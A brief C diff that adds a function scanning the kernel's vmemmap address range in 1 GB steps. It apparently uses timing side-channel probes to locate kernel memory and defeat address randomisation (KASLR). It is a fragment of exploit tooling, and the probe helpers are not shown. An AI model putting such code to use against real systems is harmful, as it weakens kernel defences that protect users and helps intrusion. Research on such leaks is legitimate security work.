@@ -17,6 +17,20 @@
 #define VMEMMAP_START  0xffff888800000000
 #define VMEMMAP_END    (0xfffffe0000000000-(1ULL<<30))
 
+void search_all_coarse_grains(size_t tries)
+{
+    size_t addr;
+    for (addr = VMEMMAP_END; addr > VMEMMAP_START; addr -= (1ULL << 30)) {
+        for (size_t i = 0; i < tries; ++i) {
+            size_t found = hit(addr, 4) && hit_accurate(addr, 30);
+            if (found) {
+                printf("[*]   found %016zx\n", addr);
+                break;
+            }
+        }
+    }
+}
+
 size_t __vmemmap_leak(size_t tries, size_t *found)
 {
     size_t addr;
